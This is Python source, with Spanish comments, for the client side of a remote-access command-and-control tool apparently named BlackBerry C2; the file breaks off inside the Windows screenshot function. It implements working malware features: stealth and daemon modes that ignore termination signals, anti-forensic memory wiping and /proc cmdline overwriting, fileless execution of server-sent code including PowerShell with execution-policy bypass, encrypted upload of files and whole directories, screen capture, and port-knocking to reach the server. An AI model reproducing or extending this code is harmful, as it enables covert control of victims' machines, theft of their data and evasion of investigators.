#!/usr/bin/env python3
# BlackBerry Client TCP

import socket, struct, sys, os, time, threading, getpass, subprocess, hashlib, signal, zlib, json, io, base64, random, argparse
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding, ec
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
import hmac as hmac_module

# Zstandard para archivos grandes (opcional)
try:
    import zstandard as zstd
    ZSTD_AVAILABLE = True
except ImportError:
    ZSTD_AVAILABLE = False


# Anti-replay tracking global para el cliente
client_send_sequence = 0
client_send_lock = threading.Lock()

def get_next_sequence():
    global client_send_sequence
    with client_send_lock:
        seq = client_send_sequence
        client_send_sequence += 1
        return seq


# ==================== CONFIGURACIÓN ====================
SERVER_HOST = "localhost"
SERVER_PORT = 9949
HMAC_PRE_SHARED_SECRET = b"BlackBerryC2-HMACSecret"
VERIFY_FINGERPRINT = False
EXPECTED_FINGERPRINT = ""
DAEMON_MODE = False

# ==================== SPA / PORT-KNOCKING ====================
# Espejo de la configuración del servidor.
# Se activa con --spa (modo "spa") o --knock (modo "knock").
SPA_ENABLED    = False
SPA_MODE       = "spa"       # "spa" | "knock"
SPA_SERVER_IP  = ""          # se rellena en main desde SERVER_HOST
SPA_UDP_PORT   = 7331        # debe coincidir con --spa-port del servidor
KNOCK_SEQUENCE = [7001, 7002, 7003]   # debe coincidir con --knock-seq del servidor
KNOCK_DELAY    = 0.3         # segundos entre golpes

def spa_send_token(server_ip: str, hmac_secret: bytes, udp_port: int) -> bool:
    """
    Modo SPA: envía un paquete UDP con el token HMAC firmado.
    token = HMAC-SHA256(HMAC_SECRET, "{mi_ip}:{ventana_30s}")
    El servidor verifica ventana actual y la anterior (±30 s de drift).
    
    NOTA: 'my_ip' es la IP que el servidor ve llegar — si hay NAT puede ser
    diferente a la local. Si tienes NAT, usa --spa-src-ip para especificarla.
    """
    try:
        # Detectar IP de salida que ve el servidor
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as probe:
            probe.connect((server_ip, udp_port))
            my_ip = probe.getsockname()[0]

        window = int(time.time()) // 30
        msg    = f"{my_ip}:{window}".encode()
        token  = hmac_module.new(hmac_secret, msg, hashlib.sha256).digest()

        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.settimeout(3)
            s.sendto(token, (server_ip, udp_port))

        if not DAEMON_MODE:
            print(f"[SPA] Token enviado a {server_ip}:{udp_port}  (IP vista: {my_ip})")
        return True
    except Exception as e:
        if not DAEMON_MODE:
            print(f"[SPA] Error enviando token: {e}")
        return False

def spa_knock_sequence(server_ip: str, ports: list, delay: float = 0.3) -> bool:
    """
    Modo knock: envía paquetes UDP vacíos a cada puerto en orden.
    """
    try:
        if not DAEMON_MODE:
            print(f"[KNOCK] Iniciando secuencia: {' → '.join(map(str, ports))}")
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.settimeout(3)
            for port in ports:
                s.sendto(b'', (server_ip, port))
                if not DAEMON_MODE:
                    print(f"[KNOCK]  → {server_ip}:{port}")
                time.sleep(delay)
        if not DAEMON_MODE:
            print(f"[KNOCK] Secuencia completada")
        return True
    except Exception as e:
        if not DAEMON_MODE:
            print(f"[KNOCK] Error en secuencia: {e}")
        return False

def do_spa_before_connect(server_ip: str, hmac_secret: bytes,
                          wait_after: float = 1.0) -> bool:
    """
    Ejecuta SPA o knock antes de intentar la conexión TCP.
    Espera `wait_after` segundos para que el servidor procese el paquete.
    """
    if not SPA_ENABLED:
        return True

    if SPA_MODE == "knock":
        ok = spa_knock_sequence(server_ip, KNOCK_SEQUENCE, KNOCK_DELAY)
    else:
        ok = spa_send_token(server_ip, hmac_secret, SPA_UDP_PORT)

    if ok:
        time.sleep(wait_after)   # dar tiempo al servidor para autorizar la IP
    return ok

# ==================== CONFIGURACIÓN OPTIMIZADA ====================
ENABLE_COMPRESSION = True
COMPRESSION_LEVEL = 9
HEARTBEAT_INTERVAL = 160
RECV_TIMEOUT = 10
AES_KEY_BYTES = 32
MAX_OUTPUT_SIZE = 1024 * 1024 * 100
CHUNK_SIZE = 64 * 1024
PUBKEY_READ_LIMIT = 8192
RECONNECT_DELAY = 30

# ==================== DYNAMIC FILE TRANSFER ====================
FILE_TIMEOUT_BASE = 90
FILE_TIMEOUT_PER_MB = 20
FILE_MAX_TIMEOUT = 7200
FILE_MIN_TIMEOUT = 45
LARGE_FILE_THRESHOLD = 1024 * 1024 * 1024  # 1GB

EXEC_TIMEOUT = 120

# ==================== MODO SIGILOSO ====================
class SilentMode:
    def write(self, x): pass
    def flush(self): pass

def enable_stealth():
    sys.stdout = SilentMode()
    sys.stderr = SilentMode()
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    signal.signal(signal.SIGTERM, signal.SIG_IGN)
    try:
        os.chdir("/tmp")
    except:
        pass

# ==================== LIMPIEZA PROFUNDA DE MEMORIA ====================

def deep_memory_cleanup():
    """
    Limpieza PROFUNDA de memoria sin dejar rastros.
    - Sobrescribe frames de Python
    - Limpia todas las variables globales
    - Fuerza múltiples GC
    - Limpia bytecode cache
    """
    import gc
    import sys
    
    try:
        # 1. Obtener todos los frames activos y limpiarlos
        frame = sys._getframe()
        while frame:
            try:
                # Sobrescribir variables locales del frame
                if hasattr(frame, 'f_locals'):
                    for var_name in list(frame.f_locals.keys()):
                        try:
                            frame.f_locals[var_name] = None
                        except:
                            pass
                
                # Limpiar código del frame
                if hasattr(frame, 'f_code'):
                    try:
                        # Intentar limpiar constantes
                        if hasattr(frame.f_code, 'co_consts'):
                            pass  # Read-only, no podemos modificar
                    except:
                        pass
                
                frame = frame.f_back
            except:
                break
        
        # 2. Limpiar todas las variables globales sensibles
        globals_to_clean = [
            'SERVER_HOST', 'SERVER_PORT', 'AES_KEY_BYTES',
            'HEARTBEAT_INTERVAL', 'RECONNECT_DELAY'
        ]
        
        for var in globals_to_clean:
            try:
                if var in globals():
                    globals()[var] = None
            except:
                pass
        
        # 3. Limpiar cache de módulos importados
        try:
            # Limpiar __pycache__ de imports sensibles
            for module_name in list(sys.modules.keys()):
                if 'BlackBerry' in module_name or 'crypto' in module_name:
                    try:
                        sys.modules[module_name] = None
                    except:
                        pass
        except:
            pass
        
        # 4. Forzar múltiples recolecciones de basura
        for _ in range(5):
            gc.collect(2)  # Full collection
        
        # 5. Limpiar traceback y exception info
        sys.exc_clear() if hasattr(sys, 'exc_clear') else None
        
        return True
        
    except Exception:
        return False

def zombie_process_cleanup():
    """
    Limpia procesos zombie y entradas en /proc si es posible.
    """
    try:
        import os
        import signal
        
        # Intentar limpiar procesos zombie hijos
        try:
            os.waitpid(-1, os.WNOHANG)
        except:
            pass
        
        # En Linux, intentar limpiar entradas de /proc
        if sys.platform.startswith('linux'):
            try:
                pid = os.getpid()
                # Limpiar cmdline si tenemos permisos
                cmdline_path = f'/proc/{pid}/cmdline'
                if os.access(cmdline_path, os.W_OK):
                    try:
                        with open(cmdline_path, 'w') as f:
                            f.write('\x00' * 16)
                    except:
                        pass
            except:
                pass
        
        return True
    except:
        return False

def daemonize():
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        pass
    os.setsid()
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        pass
    sys.stdout.flush()
    sys.stderr.flush()
    with open(os.devnull, 'r') as dev_null:
        os.dup2(dev_null.fileno(), sys.stdin.fileno())
    with open(os.devnull, 'a+') as dev_null:
        os.dup2(dev_null.fileno(), sys.stdout.fileno())
    with open(os.devnull, 'a+') as dev_null:
        os.dup2(dev_null.fileno(), sys.stderr.fileno())

def get_ecdhe_fingerprint(public_key_pem):
    """Calcula fingerprint SHA256 de la clave pública ECDHE."""
    sha256_hash = hashlib.sha256(public_key_pem).hexdigest()
    return ':'.join(sha256_hash[i:i+2] for i in range(0, len(sha256_hash), 2))

# ==================== FUNCIONES DE PROTOCOLO ====================
def calculate_file_timeout(file_size_bytes):
    """Calcula timeout dinámico basado en tamaño de archivo."""
    size_mb = file_size_bytes / (1024 * 1024)
    timeout = FILE_TIMEOUT_BASE + (size_mb * FILE_TIMEOUT_PER_MB)
    return max(FILE_MIN_TIMEOUT, min(timeout, FILE_MAX_TIMEOUT))

def recvall(sock, n, timeout=30):
    data = b''
    end_time = time.time() + timeout
    while len(data) < n:
        time_left = end_time - time.time()
        if time_left <= 0:
            return None
        sock.settimeout(time_left)
        try:
            packet = sock.recv(n - len(data))
            if not packet:
                return None
            data += packet
        except:
            return None
    return data

def send_encrypted_message(sock, plaintext, aes_key, timeout=30):
    """Cliente: envío con HMAC por paquete"""
    try:
        plaintext_bytes = plaintext.encode('utf-8', 'replace') if isinstance(plaintext, str) else plaintext
        
        flag = 0
        payload = plaintext_bytes
        
        if ENABLE_COMPRESSION and len(plaintext_bytes) > 100:
            try:
                compressed = zlib.compress(plaintext_bytes, level=COMPRESSION_LEVEL)
                if len(compressed) < len(plaintext_bytes):
                    payload = compressed
                    flag = 1
            except:
                pass
        
        aesgcm = AESGCM(aes_key)
        nonce = os.urandom(12)
        ciphertext = aesgcm.encrypt(nonce, payload, None)
        
        # Sequence number
        sequence_num = get_next_sequence()
        sequence_bytes = struct.pack('!Q', sequence_num)
        
        # HMAC sobre: seq || nonce || ciphertext
        hmac_data = sequence_bytes + nonce + ciphertext
        hmac_tag = hmac_module.new(aes_key, hmac_data, hashlib.sha256).digest()
        
        # Construir: seq + flag + nonce + ciphertext + HMAC
        message = sequence_bytes + bytes([flag]) + nonce + ciphertext + hmac_tag
        full_packet = struct.pack('!I', len(message)) + message
        
        sock.settimeout(timeout)
        sock.sendall(full_packet)
        return True
    except:
        return False


def receive_encrypted_message(sock, aes_key, timeout=RECV_TIMEOUT):
    """Cliente: recepción con verificación HMAC"""
    try:
        raw_len = recvall(sock, 4, timeout)
        if not raw_len:
            return None, None
        
        msg_len = struct.unpack('!I', raw_len)[0]
        if msg_len > MAX_OUTPUT_SIZE:
            return None, None
        
        data = recvall(sock, msg_len, timeout=max(15, msg_len / 10000))
        if not data or len(data) < 53:
            return None, None
        
        # Parsear: [8:seq][1:flag][12:nonce][ciphertext][32:HMAC]
        sequence_bytes = data[0:8]
        flag = data[8]
        nonce = data[9:21]
        hmac_tag = data[-32:]
        ciphertext = data[21:-32]
        
        # Verificar HMAC
        hmac_data = sequence_bytes + nonce + ciphertext
        expected_hmac = hmac_module.new(aes_key, hmac_data, hashlib.sha256).digest()
        
        if not hmac_module.compare_digest(hmac_tag, expected_hmac):
            return None, None
        
        # Descifrar
        aesgcm = AESGCM(aes_key)
        plaintext_bytes = aesgcm.decrypt(nonce, ciphertext, None)
        
        if flag == 1:
            plaintext_bytes = zlib.decompress(plaintext_bytes)
        elif flag == 2:
            if ZSTD_AVAILABLE:
                dctx = zstd.ZstdDecompressor()
                plaintext_bytes = dctx.decompress(plaintext_bytes)
            else:
                return None, None
        
        return plaintext_bytes, plaintext_bytes.decode('utf-8', 'replace')
    except:
        return None, None


def normalize_path(path):
    """Normaliza una ruta para prevenir directory traversal."""
    # Resolver ruta absoluta y normalizar
    normalized = os.path.normpath(path)
    # Eliminar referencias a directorio padre
    if '..' in normalized.split(os.sep):
        return None
    return normalized

def send_file_to_server(sock, aes_key, file_path):
    """Envía un archivo individual al servidor."""
    try:
        if not os.path.isfile(file_path):
            send_encrypted_message(sock, f"[ERROR] Archivo no encontrado: {file_path}", aes_key)
            return
        
        file_size = os.path.getsize(file_path)
        timeout = calculate_file_timeout(file_size)
        
        # Decidir compresión
        use_zstd = file_size >= LARGE_FILE_THRESHOLD and ZSTD_AVAILABLE
        if use_zstd:
            cctx = zstd.ZstdCompressor(level=3)
        
        sha = hashlib.sha256()
        with open(file_path, 'rb') as f:
            for chunk in iter(lambda: f.read(CHUNK_SIZE), b''):
                sha.update(chunk)
        file_hash = sha.hexdigest()
        
        header = f"SIZE {file_size} {file_hash}"
        if not send_encrypted_message(sock, header, aes_key, timeout=timeout):
            return
        
        with open(file_path, 'rb') as f:
            while chunk := f.read(CHUNK_SIZE):
                flag = 0
                payload_chunk = chunk
                
                if use_zstd:
                    try:
                        comp = cctx.compress(chunk)
                        if len(comp) < len(chunk):
                            payload_chunk = comp
                            flag = 2
                    except:
                        pass
                elif ENABLE_COMPRESSION:
                    try:
                        comp = zlib.compress(chunk, level=COMPRESSION_LEVEL)
                        if len(comp) < len(chunk):
                            payload_chunk = comp
                            flag = 1
                    except:
                        pass
                
                aesgcm = AESGCM(aes_key)
                nonce = os.urandom(12)
                ct = aesgcm.encrypt(nonce, payload_chunk, None)
                packet = bytes([flag]) + nonce + ct
                full_packet = struct.pack('!I', len(packet)) + packet
                
                sock.settimeout(timeout)
                sock.sendall(full_packet)
    except:
        pass

# ==================== TRANSFERENCIA RECURSIVA ====================

def send_directory_recursive(sock, aes_key, dir_path, base_path=None):
    """
    Envía un directorio completo de forma recursiva.
    
    Protocolo:
    1. DIR_START <metadata_json> - Inicia transferencia de directorio
    2. Para cada entrada:
       - Si es directorio: llamada recursiva
       - Si es archivo: FILE_ITEM <metadata_json> + chunks del archivo
    3. DIR_END - Finaliza el directorio actual
    
    Args:
        sock: Socket de conexión
        aes_key: Clave AES para cifrado
        dir_path: Ruta del directorio a enviar
        base_path: Ruta base para calcular rutas relativas (None = usar dir_path como base)
    """
    try:
        # Normalizar rutas para seguridad
        dir_path = normalize_path(dir_path)
        if not dir_path or not os.path.isdir(dir_path):
            send_encrypted_message(sock, f"[ERROR] Directorio no encontrado: {dir_path}", aes_key)
            return False
        
        # Si es la primera llamada, establecer base_path
        if base_path is None:
            base_path = os.path.dirname(dir_path) if os.path.dirname(dir_path) else "."
            base_path = normalize_path(base_path)
        
        # Calcular ruta relativa
        rel_path = os.path.relpath(dir_path, base_path)
        
        # Metadatos del directorio
        dir_metadata = {
            "type": "directory",
            "path": rel_path,
            "name": os.path.basename(dir_path)
        }
        
        # Enviar señal DIR_START con metadatos
        msg = f"DIR_START {json.dumps(dir_metadata)}"
        if not send_encrypted_message(sock, msg, aes_key):
            return False
        
        # Recorrer contenido del directorio
        try:
            entries = sorted(os.listdir(dir_path))
        except PermissionError:
            send_encrypted_message(sock, f"[ERROR] Permiso denegado: {dir_path}", aes_key)
            # Continuar con DIR_END para mantener protocolo consistente
            send_encrypted_message(sock, "DIR_END", aes_key)
            return True
        
        for entry in entries:
            entry_path = os.path.join(dir_path, entry)
            
            # Normalizar y verificar seguridad
            entry_path = normalize_path(entry_path)
            if not entry_path:
                continue
            
            if os.path.islink(entry_path):
                # Ignorar enlaces simbólicos por seguridad
                continue
            elif os.path.isdir(entry_path):
                # Recursión para subdirectorios
                if not send_directory_recursive(sock, aes_key, entry_path, base_path):
                    return False
            elif os.path.isfile(entry_path):
                # Enviar archivo
                if not send_file_in_directory_context(sock, aes_key, entry_path, base_path):
                    return False
        
        # Señal DIR_END
        if not send_encrypted_message(sock, "DIR_END", aes_key):
            return False
        
        return True
        
    except Exception as e:
        send_encrypted_message(sock, f"[ERROR] Error enviando directorio: {e}", aes_key)
        return False

def send_file_in_directory_context(sock, aes_key, file_path, base_path):
    """
    Envía un archivo dentro del contexto de transferencia de directorio.
    
    Protocolo:
    1. FILE_ITEM <metadata_json> - Metadatos del archivo
    2. SIZE <size> <hash> - Header del archivo (protocolo existente)
    3. Chunks del archivo
    """
    try:
        file_path = normalize_path(file_path)
        if not file_path or not os.path.isfile(file_path):
            return False
        
        # Calcular ruta relativa
        rel_path = os.path.relpath(file_path, base_path)
        file_size = os.path.getsize(file_path)
        
        # Metadatos del archivo
        file_metadata = {
            "type": "file",
            "path": rel_path,
            "name": os.path.basename(file_path),
            "size": file_size
        }
        
        # Enviar señal FILE_ITEM con metadatos
        msg = f"FILE_ITEM {json.dumps(file_metadata)}"
        if not send_encrypted_message(sock, msg, aes_key):
            return False
        
        # Calcular hash
        sha = hashlib.sha256()
        with open(file_path, 'rb') as f:
            for chunk in iter(lambda: f.read(CHUNK_SIZE), b''):
                sha.update(chunk)
        file_hash = sha.hexdigest()
        
        # Enviar header SIZE (protocolo existente)
        timeout = calculate_file_timeout(file_size)
        header = f"SIZE {file_size} {file_hash}"
        if not send_encrypted_message(sock, header, aes_key, timeout=timeout):
            return False
        
        # Decidir compresión
        use_zstd = file_size >= LARGE_FILE_THRESHOLD and ZSTD_AVAILABLE
        if use_zstd:
            cctx = zstd.ZstdCompressor(level=3)
        
        # Enviar chunks del archivo
        with open(file_path, 'rb') as f:
            while chunk := f.read(CHUNK_SIZE):
                flag = 0
                payload_chunk = chunk
                
                if use_zstd:
                    try:
                        comp = cctx.compress(chunk)
                        if len(comp) < len(chunk):
                            payload_chunk = comp
                            flag = 2
                    except:
                        pass
                elif ENABLE_COMPRESSION:
                    try:
                        comp = zlib.compress(chunk, level=COMPRESSION_LEVEL)
                        if len(comp) < len(chunk):
                            payload_chunk = comp
                            flag = 1
                    except:
                        pass
                
                aesgcm = AESGCM(aes_key)
                nonce = os.urandom(12)
                ct = aesgcm.encrypt(nonce, payload_chunk, None)
                packet = bytes([flag]) + nonce + ct
                full_packet = struct.pack('!I', len(packet)) + packet
                
                sock.settimeout(timeout)
                sock.sendall(full_packet)
        
        return True
        
    except Exception as e:
        return False

def receive_directory_recursive(sock, aes_key, base_output_dir="."):
    """
    Recibe un directorio completo de forma recursiva.
    
    Maneja el protocolo de transferencia de directorios:
    - DIR_START: Crea el directorio
    - FILE_ITEM: Recibe metadatos y luego el archivo
    - DIR_END: Finaliza el directorio actual
    
    Returns:
        True si la transferencia fue exitosa, False en caso contrario
    """
    try:
        # Normalizar directorio base
        base_output_dir = normalize_path(base_output_dir)
        if not base_output_dir:
            base_output_dir = "."
        
        # Pila para rastrear directorios anidados
        dir_stack = []
        
        while True:
            # Recibir mensaje
            _, msg = receive_encrypted_message(sock, aes_key, timeout=60)
            if msg is None:
                return False
            
            if msg.startswith("DIR_START "):
                # Nuevo directorio
                try:
                    metadata_json = msg[len("DIR_START "):]
                    metadata = json.loads(metadata_json)
                    
                    dir_rel_path = metadata.get("path", "")
                    dir_full_path = os.path.join(base_output_dir, dir_rel_path)
                    
                    # Normalizar y verificar seguridad
                    dir_full_path = normalize_path(dir_full_path)
                    if not dir_full_path:
                        continue
                    
                    # Crear directorio si no existe
                    os.makedirs(dir_full_path, exist_ok=True)
                    
                    # Agregar a pila
                    dir_stack.append(dir_full_path)
                    
                except Exception as e:
                    return False
                    
            elif msg.startswith("FILE_ITEM "):
                # Nuevo archivo
                try:
                    metadata_json = msg[len("FILE_ITEM "):]
                    metadata = json.loads(metadata_json)
                    
                    file_rel_path = metadata.get("path", "")
                    file_size = metadata.get("size", 0)
                    
                    file_full_path = os.path.join(base_output_dir, file_rel_path)
                    
                    # Normalizar y verificar seguridad
                    file_full_path = normalize_path(file_full_path)
                    if not file_full_path:
                        continue
                    
                    # Asegurar que el directorio padre existe
                    file_dir = os.path.dirname(file_full_path)
                    if file_dir:
                        os.makedirs(file_dir, exist_ok=True)
                    
                    # Recibir el archivo usando el protocolo existente
                    if not receive_file_stream(sock, aes_key, file_full_path, file_size):
                        return False
                        
                except Exception as e:
                    return False
                    
            elif msg == "DIR_END":
                # Finalizar directorio actual
                if dir_stack:
                    dir_stack.pop()
                
                # Si la pila está vacía, hemos terminado
                if not dir_stack:
                    return True
                    
            elif msg.startswith("[ERROR]"):
                # Error del servidor
                return False
                
            elif msg.startswith("[SUCCESS]"):
                # Mensaje de éxito
                return True
            else:
                # Mensaje desconocido, podría ser un error
                continue
                
    except Exception as e:
        return False

def receive_file_stream(sock, aes_key, output_path, expected_size):
    """
    Recibe un archivo usando el protocolo de chunks existente.
    
    Args:
        sock: Socket de conexión
        aes_key: Clave AES
        output_path: Ruta donde guardar el archivo
        expected_size: Tamaño esperado del archivo
    
    Returns:
        True si la recepción fue exitosa
    """
    try:
        # Recibir header SIZE
        _, header_msg = receive_encrypted_message(sock, aes_key, timeout=30)
        if not header_msg or not header_msg.startswith("SIZE "):
            return False
        
        parts = header_msg.split()
        file_size = int(parts[1])
        expected_hash = parts[2]
        
        timeout = calculate_file_timeout(file_size)
        
        # Preparar descompresor si es archivo grande
        use_zstd = file_size >= LARGE_FILE_THRESHOLD and ZSTD_AVAILABLE
        if use_zstd:
            dctx = zstd.ZstdDecompressor()
        
        received = 0
        sha = hashlib.sha256()
        
        with open(output_path, 'wb') as f:
            while received < file_size:
                # Recibir chunk
                raw_len = recvall(sock, 4, timeout=timeout)
                if not raw_len:
                    return False
                
                packet_len = struct.unpack('!I', raw_len)[0]
                packet = recvall(sock, packet_len, timeout=timeout)
                if not packet or len(packet) < 13:
                    return False
                
                # Descifrar
                flag = packet[0]
                nonce = packet[1:13]
                ct = packet[13:]
                
                aesgcm = AESGCM(aes_key)
                chunk = aesgcm.decrypt(nonce, ct, None)
                
                # Descomprimir
                if flag == 2:  # Zstandard
                    if not use_zstd:
                        return False
                    chunk = dctx.decompress(chunk)
                elif flag == 1:  # zlib
                    chunk = zlib.decompress(chunk)
                
                # Escribir y actualizar hash
                f.write(chunk)
                sha.update(chunk)
                received += len(chunk)
        
        # Verificar integridad
        actual_hash = sha.hexdigest()
        if actual_hash != expected_hash or received != file_size:
            return False
        
        return True
        
    except Exception as e:
        return False

# ==================== FUNCIONES EXISTENTES (Sin cambios) ====================

def execute_in_memory_robust(file_bytes, file_name="<received>"):
    """
    Ejecución FILELESS anti-forense en memoria.
    - Ejecuta en el mismo proceso (Python)
    - Borra todo rastro de memoria después
    - Sin archivos temporales
    - Soporte multi-lenguaje interpretado
    """
    import gc
    
    ext = os.path.splitext(file_name)[1].lower()
    
    # Interpretes soportados (solo lenguajes NO compilables)
    interpreters = {
        ".py": ("python", ["python3", "-c"]),
        ".py2": ("python2", ["python2", "-c"]),
        ".sh": ("bash", ["bash", "-c"]),
        ".bash": ("bash", ["bash", "-c"]),
        ".pl": ("perl", ["perl", "-e"]),
        ".rb": ("ruby", ["ruby", "-e"]),
        ".php": ("php", ["php", "-r"]),
        ".js": ("node", ["node", "-e"]),
        ".lua": ("lua", ["lua", "-e"]),
        ".awk": ("awk", ["awk"]),
        ".r": ("r", ["Rscript", "-e"]),
        ".R": ("r", ["Rscript", "-e"]),
        ".ps1": ("powershell", ["pwsh", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command"]),
        ".zsh": ("zsh", ["zsh", "-c"]),
        ".fish": ("fish", ["fish", "-c"]),
        ".ksh": ("ksh", ["ksh", "-c"]),
        ".csh": ("csh", ["csh", "-c"]),
        ".tcsh": ("tcsh", ["tcsh", "-c"]),
    }
    
    lang_type, interpreter_cmd = interpreters.get(ext, ("bash", ["bash", "-c"]))
    
    try:
        # Decodificar código
        code_str = file_bytes.decode('utf-8', errors='replace')
        
        # ========== EJECUCIÓN PYTHON EN EL MISMO PROCESO (FILELESS TOTAL) ==========
        if lang_type in ("python", "python2"):
            try:
                # Crear namespace temporal aislado
                temp_namespace = {
                    '__builtins__': __builtins__,
                    '__name__': '__main__',
                    '__file__': '<memory>',
                }
                
                # Capturar stdout/stderr
                from io import StringIO
                import sys
                
                old_stdout = sys.stdout
                old_stderr = sys.stderr
                captured_out = StringIO()
                captured_err = StringIO()
                
                try:
                    sys.stdout = captured_out
                    sys.stderr = captured_err
                    
                    # EJECUTAR EN MEMORIA (mismo proceso, sin subprocess)
                    exec(compile(code_str, '<memory>', 'exec'), temp_namespace)
                    
                finally:
                    sys.stdout = old_stdout
                    sys.stderr = old_stderr
                
                # Obtener salida
                stdout_data = captured_out.getvalue()
                stderr_data = captured_err.getvalue()
                output = (stdout_data + stderr_data).strip()
                
                # LIMPIEZA ANTI-FORENSE
                # Sobrescribir código en memoria antes de borrar
                code_str = None
                file_bytes = None
                
                # Limpiar namespace temporal
                for key in list(temp_namespace.keys()):
                    temp_namespace[key] = None
                temp_namespace.clear()
                
                # Limpiar capturas
                captured_out.close()
                captured_err.close()
                
                # Forzar recolección de basura
                gc.collect()
                
                # LIMPIEZA PROFUNDA DE MEMORIA
                try:
                    deep_memory_cleanup()
                    zombie_process_cleanup()
                except:
                    pass
                
                if not output:
                    output = "[Ejecutado exitosamente en memoria]"
                
                return True, output
                
            except SyntaxError as e:
                return False, f"[ERROR] Sintaxis Python: {e}"
            except Exception as e:
                return False, f"[ERROR] Ejecución Python: {str(e)}"
        
        # ========== OTROS LENGUAJES: STDIN PIPE (SIN ARCHIVOS TEMP) ==========
        else:
            try:
                # Usar stdin para pasar el código (sin archivos)
                if lang_type == "awk":
                    # AWK necesita el código como argumento
                    proc = subprocess.Popen(
                        ["awk", code_str],
                        stdin=subprocess.PIPE,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=False
                    )
                else:
                    # La mayoría soporta -c/-e con stdin
                    proc = subprocess.Popen(
                        interpreter_cmd + [code_str],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=False,
                        close_fds=True  # Cerrar file descriptors para no dejar rastro
                    )
                
                # Ejecutar con timeout
                try:
                    stdout_data, stderr_data = proc.communicate(timeout=EXEC_TIMEOUT)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    stdout_data, stderr_data = proc.communicate()
                    
                    # LIMPIEZA
                    code_str = None
                    file_bytes = None
                    gc.collect()
                    
                    return False, f"[TIMEOUT] Ejecución excedió {EXEC_TIMEOUT}s"
                
                # Procesar salida
                stdout_text = stdout_data.decode('utf-8', errors='replace')
                stderr_text = stderr_data.decode('utf-8', errors='replace')
                output = (stdout_text + stderr_text).strip()
                
                # LIMPIEZA ANTI-FORENSE
                code_str = None
                file_bytes = None
                stdout_data = None
                stderr_data = None
                gc.collect()
                
                # LIMPIEZA PROFUNDA DE MEMORIA
                try:
                    deep_memory_cleanup()
                    zombie_process_cleanup()
                except:
                    pass
                
                if not output:
                    output = f"[Ejecutado. Código: {proc.returncode}]"
                
                return True, output
                
            except FileNotFoundError:
                return False, f"[ERROR] Intérprete no encontrado: {interpreter_cmd[0]}"
            except Exception as e:
                # Limpieza en caso de error
                code_str = None
                file_bytes = None
                gc.collect()
                return False, f"[ERROR] Ejecución: {str(e)}"
    
    except Exception as e:
        # Limpieza final en cualquier error
        try:
            code_str = None
            file_bytes = None
            gc.collect()
        except:
            pass
        return False, f"[ERROR] Fallo crítico: {str(e)}"

def handle_incoming_file(header_msg, sock, aes_key):
    try:
        parts = header_msg.split()
        file_size, expected_hash = int(parts[1]), parts[2]
        
        timeout = calculate_file_timeout(file_size)
        
        # Preparar descompresor
        use_zstd = file_size >= LARGE_FILE_THRESHOLD and ZSTD_AVAILABLE
        if use_zstd:
            dctx = zstd.ZstdDecompressor()
        
        file_data = b''
        sha = hashlib.sha256()
        
        while len(file_data) < file_size:
            raw_len = recvall(sock, 4, timeout=timeout)
            if not raw_len:
                return
            
            packet_len = struct.unpack('!I', raw_len)[0]
            packet = recvall(sock, packet_len, timeout=timeout)
            if not packet or len(packet) < 13:
                return
            
            flag = packet[0]
            nonce = packet[1:13]
            ct = packet[13:]
            
            aesgcm = AESGCM(aes_key)
            chunk = aesgcm.decrypt(nonce, ct, None)
            
            if flag == 2:
                if not use_zstd:
                    return
                chunk = dctx.decompress(chunk)
            elif flag == 1:
                chunk = zlib.decompress(chunk)
            
            file_data += chunk
            sha.update(chunk)
        
        if sha.hexdigest() != expected_hash:
            send_encrypted_message(sock, "[ERROR] Fallo de integridad", aes_key)
            return
        
        _, final_command_str = receive_encrypted_message(sock, aes_key, timeout=timeout)
        if not final_command_str or not final_command_str.startswith("PUT_FILE"):
            return
        
        parts = final_command_str.split()
        file_name = parts[1]
        execute = "-exc" in parts
        
        response_msg = ""
        
        if execute:
            success, out = execute_in_memory_robust(file_data, file_name)
            
            if len(out) > MAX_OUTPUT_SIZE:
                out = out[:MAX_OUTPUT_SIZE] + f"\n[... truncado, {len(out)} bytes totales]"
            
            if success:
                response_msg = f"[SUCCESS] '{file_name}' ejecutado:\n{out}"
            else:
                response_msg = f"[ERROR] Fallo: {out}"
        else:
            try:
                save_path = os.path.basename(file_name)
                with open(save_path, "wb") as f:
                    f.write(file_data)
                response_msg = f"[SUCCESS] Archivo '{save_path}' guardado"
            except Exception as e:
                response_msg = f"[ERROR] No se pudo guardar: {e}"
        
        send_encrypted_message(sock, response_msg, aes_key, timeout=EXEC_TIMEOUT)
    except:
        pass

# ==================== CAPTURA DE PANTALLA MULTIPLATAFORMA ====================

def capture_screenshot():
    """
    Captura la pantalla usando métodos nativos del sistema operativo.
    Retorna los bytes de la imagen en formato BMP/PNG sin guardar archivos.
    
    Multiplataforma:
    - Windows: ctypes + GDI32 (nativo)
    - Linux: scrot/imagemagick/xwd/gnome-screenshot
    - macOS: screencapture (nativo)
    
    Returns:
        bytes: Datos de la imagen o None si falla
    """
    system = sys.platform
    
    try:
        if system == 'win32':
            return _capture_screenshot_windows()
        elif system.startswith('linux'):
            return _capture_screenshot_linux()
        elif system == 'darwin':
            return _capture_screenshot_macos()
        else:
            return None
    except Exception:
        return None

def _capture_screenshot_windows():
    """Captura en Windows usando ctypes + GDI32"""
    try:
        import ctypes
        from ctypes import windll, byref, c_int, Structure, POINTER
        from ctypes.wintypes import BYTE, WORD, DWORD, LONG, HANDLE
        
        class BITMAPINFOHEADER(Structure):
            _fields_ = [
                ('biSize', DWORD), ('biWidth', LONG), ('biHeight', LONG),
                ('biPlanes', WORD), ('biBitCount', WORD), ('biCompression', DWORD),
                ('biSizeImage', DWORD), ('biXPelsPerMeter', LONG),
                ('biYPelsPerMeter', LONG), ('biClrUsed', DWORD), ('biClrImportant', DWORD)
            ]
        
        class BITMAPINFO(Structure):
            _fields_ = [('bmiHeader', BITMAPINFOHEADER), ('bmiColors', DWORD * 3)]
        
